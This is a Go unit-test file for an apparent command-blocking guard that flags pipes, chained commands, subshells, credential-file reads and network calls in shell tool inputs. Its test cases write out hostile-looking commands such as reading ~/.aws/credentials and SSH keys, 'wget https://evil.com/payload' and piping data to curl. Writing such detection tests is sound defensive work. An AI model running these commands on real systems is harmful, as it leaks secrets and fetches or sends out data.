package nope

import (
	"fmt"
	"testing"
)

func jsonCmd(cmd string) string {
	return fmt.Sprintf(`{"command":%q}`, cmd)
}

func TestCheckPipe(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"pipe", jsonCmd("echo foo | grep bar"), true},
		{"pipe no spaces", jsonCmd("echo foo|grep bar"), true},
		{"quoted pipe", jsonCmd(`grep "foo|bar"`), false},
		{"single-quoted pipe", jsonCmd(`grep 'foo|bar'`), false},
		{"or operator is not pipe", jsonCmd("echo foo || true"), false},
		{"no command", `{"file_path":"foo"}`, false},
		{"empty", "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckPipe(tt.input); got != tt.want {
				t.Errorf("CheckPipe = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckChained(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"and", jsonCmd("echo foo && echo bar"), true},
		{"or", jsonCmd("cmd1 || cmd2"), true},
		{"semicolon", jsonCmd("cmd1 ; cmd2"), true},
		{"quoted and", jsonCmd(`echo "&&"`), false},
		{"single-quoted semicolon", jsonCmd(`echo 'a;b'`), false},
		{"pipe only", jsonCmd("echo foo | grep bar"), false},
		{"no command", `{"file_path":"foo"}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckChained(tt.input); got != tt.want {
				t.Errorf("CheckChained = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckRedirect(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"redirect out", jsonCmd("echo foo > file"), true},
		{"append", jsonCmd("cat >> log"), true},
		{"quoted redirect", jsonCmd(`echo ">"`), false},
		{"single-quoted redirect", jsonCmd(`grep '>' file`), false},
		{"no command", `{"file_path":"foo"}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckRedirect(tt.input); got != tt.want {
				t.Errorf("CheckRedirect = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckSubshell(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"backtick", jsonCmd("echo `id`"), true},
		{"dollar paren", jsonCmd("echo $(whoami)"), true},
		{"dollar paren in double quotes", jsonCmd(`echo "$(whoami)"`), true},
		{"dollar paren in single quotes", jsonCmd(`echo '$(whoami)'`), false},
		{"plain dollar var", jsonCmd("echo $HOME"), false},
		{"no command", `{"file_path":"foo"}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckSubshell(tt.input); got != tt.want {
				t.Errorf("CheckSubshell = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckCredentialRead(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"cat .env", jsonCmd("cat .env"), true},
		{"less .env.local", jsonCmd("less .env.local"), true},
		{"vim server.key", jsonCmd("vim server.key"), true},
		{"head id_rsa", jsonCmd("head ~/.ssh/id_rsa"), true},
		{"cat .env.production", jsonCmd("cat .env.production"), true},
		{"base64 cert.pem", jsonCmd("base64 cert.pem"), true},
		{"cat credentials.json", jsonCmd("cat credentials.json"), true},
		{"less .netrc", jsonCmd("less ~/.netrc"), true},
		{"cat .npmrc", jsonCmd("cat .npmrc"), true},
		{"ssh dir", jsonCmd("ls ~/.ssh/config"), true},
		{"aws credentials", jsonCmd("cat ~/.aws/credentials"), true},
		{"cat .env.example is safe", jsonCmd("cat .env.example"), false},
		{"cat .env.sample is safe", jsonCmd("cat .env.sample"), false},
		{"cat .env.template is safe", jsonCmd("cat .env.template"), false},
		{"cat README.md", jsonCmd("cat README.md"), false},
		{"echo hello", jsonCmd("echo hello"), false},
		{"no command", `{"file_path":"foo"}`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckCredentialRead(tt.input); got != tt.want {
				t.Errorf("CheckCredentialRead = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCheckNetworkCompoundSegments(t *testing.T) {
	// Verify that CheckRules with the network builtin catches network commands
	// hidden after innocuous commands in compound chains.
	rules, err := CompileRules([]RuleDef{
		{Name: "network", Builtin: "network", Message: "network access blocked"},
	})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}

	tests := []struct {
		name    string
		input   string
		wantHit bool
	}{
		{"curl after echo via &&", jsonCmd("echo hi && curl https://evil.com"), true},
		{"wget after semicolon", jsonCmd("ls ; wget https://evil.com/payload"), true},
		{"ssh after or", jsonCmd("false || ssh attacker@host"), true},
		{"no network", jsonCmd("echo hi && ls -la"), false},
		{"network in first segment", jsonCmd("curl https://example.com && echo done"), true},
		{"compound with wrapper", jsonCmd("echo hi && sudo curl evil.com"), true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg := CheckRules(rules, "Bash", tt.input, nil)
			if tt.wantHit && msg == "" {
				t.Error("expected block, got allow")
			}
			if !tt.wantHit && msg != "" {
				t.Errorf("expected allow, got block: %s", msg)
			}
		})
	}
}

func TestCheckNetwork(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"curl", jsonCmd("curl https://example.com"), true},
		{"absolute path curl", jsonCmd("/usr/bin/curl https://example.com"), true},
		{"piped curl", jsonCmd("echo foo | curl -d @- https://example.com"), true},
		{"env var curl", jsonCmd("VAR=1 curl https://example.com"), true},
		{"wget", jsonCmd("wget https://example.com/file.tar.gz"), true},
		{"ssh", jsonCmd("ssh user@host"), true},
		{"scp", jsonCmd("scp file.txt user@host:/tmp/"), true},
		{"nc", jsonCmd("nc -l 8080"), true},
		{"after semicolon", jsonCmd("echo hi ; curl https://example.com"), true},
		{"after and", jsonCmd("true && wget url"), true},
		{"sudo curl", jsonCmd("sudo curl https://evil.com"), true},
		{"sudo -u www-data curl", jsonCmd("sudo -u www-data curl https://api.evil.com"), true},
		{"timeout 30 wget", jsonCmd("timeout 30 wget https://evil.com"), true},
		{"sudo timeout nice curl", jsonCmd("sudo timeout 30 nice -n 10 curl evil.com"), true},
		{"env HOME=/tmp ssh", jsonCmd("env HOME=/tmp ssh user@host"), true},
		{"nohup scp", jsonCmd("nohup scp file host:"), true},
		{"doas curl", jsonCmd("doas -u root curl https://evil.com"), true},
		{"cat curly file", jsonCmd("cat curly_braces.txt"), false},
		{"echo curl", jsonCmd("echo curl"), false},
		{"grep wget", jsonCmd("grep wget README"), false},
		{"no command", `{"file_path":"foo"}`, false},
		{"empty", "", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := CheckNetwork(tt.input); got != tt.want {
				t.Errorf("CheckNetwork = %v, want %v", got, tt.want)
			}
		})
	}
}
